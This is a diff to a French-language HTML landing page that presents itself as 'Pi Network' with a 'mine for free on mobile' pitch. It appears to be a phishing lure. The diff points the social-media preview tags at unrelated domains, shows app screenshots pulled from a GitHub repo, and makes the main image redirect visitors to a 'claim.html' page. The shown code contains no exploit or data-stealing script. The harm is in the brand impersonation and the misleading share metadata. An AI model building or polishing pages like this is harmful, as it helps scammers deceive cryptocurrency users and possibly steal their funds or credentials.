@@ -5,20 +5,22 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Pi Network - La Cryptomonnaie Accessible</title>
     
-    <!-- Balises Open Graph -->
+    <!-- Balises Open Graph qui pointent vers la page spéciale Facebook -->
     <meta property="og:title" content="Pi Network - Minez Gratuitement sur Mobile">
-    <meta property="og:description" content="Rejoignez Pi Network et commencez à miner la cryptomonnaie Pi dès maintenant sur votre smartphone">
-    <meta property="og:image" content="https://i.postimg.cc/4x24G0fV/In-Shot-20250930-204937227.jpg">
-    <meta property="og:image:width" content="950">
-    <meta property="og:image:height" content="1920">
-    <meta property="og:url" content="https://votresite.com/pi-network">
+    <meta property="og:description" content="Rejoignez Pi Network et commencez à miner la cryptomonnaie Pi dès maintenant sur votre smartphone. Sans consommation de batterie!">
+    <meta property="og:image" content="https://amazingpaye/facebook.html">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
+    <meta property="og:url" content="https://amazingpaye.com">
     <meta property="og:type" content="website">
     <meta property="og:locale" content="fr_FR">
+    <meta property="og:site_name" content="Pi Network">
     
+    <!-- Balises Twitter -->
     <meta name="twitter:card" content="summary_large_image">
     <meta name="twitter:title" content="Pi Network - Minez Gratuitement sur Mobile">
     <meta name="twitter:description" content="Rejoignez Pi Network et commencez à miner la cryptomonnaie Pi">
-    <meta name="twitter:image" content="https://i.postimg.cc/4x24G0fV/In-Shot-20250930-204937227.jpg">
+    <meta name="twitter:image" content="https://votresite.com/facebook-preview.html">
 
     <style>
         * {
@@ -33,9 +35,15 @@
             touch-action: pan-x pan-y;
             -webkit-touch-callout: none;
             -webkit-user-select: none;
+            -khtml-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
             user-select: none;
             overflow-x: hidden;
-            position: relative;
+        }
+        
+        html {
+            touch-action: manipulation;
         }
         
         .main-image, .continuation-image {
@@ -58,43 +66,24 @@
             height: auto;
             display: block;
         }
-        
-        /* Masquage COMPLET de l'image OG */
-        .og-image-container {
-            position: absolute;
-            top: -9999px;
-            left: -9999px;
-            width: 1px;
-            height: 1px;
-            overflow: hidden;
-            opacity: 0;
-            pointer-events: none;
-            z-index: -9999;
-        }
     </style>
 </head>
 <body>
-    <!-- Image OG masquée -->
-    <div class="og-image-container" aria-hidden="true">
-        <img src="https://i.postimg.cc/4x24G0fV/In-Shot-20250930-204937227.jpg" 
-             alt="Pi Network - Application Mobile"
-             width="950"
-             height="1920">
-    </div>
-    
-    <!-- Contenu principal -->
+    <!-- Image principale cliquable -->
     <img class="main-image" 
          src="https://github.com/Walyy578/Pi-Browser/blob/main/InShot_20250930_103151554.jpg?raw=true" 
-         alt="Image principale" 
+         alt="Image principale Pi Network" 
          onclick="window.location.href='claim.html'">
     
+    <!-- Image de continuation -->
     <img class="continuation-image" 
          src="https://github.com/Walyy578/Pi-Browser/blob/main/Screenshot_20250930-163639.jpg?raw=true" 
-         alt="Suite de l'image">
+         alt="Interface Pi Network">
     
+    <!-- Pied de page fixe -->
     <footer class="footer">
         <img src="https://github.com/Walyy578/Pi-Browser/blob/main/InShot_20250930_165420094.jpg?raw=true" 
-             alt="Pied de page">
+             alt="Télécharger Pi Network">
     </footer>
 </body>
 </html>
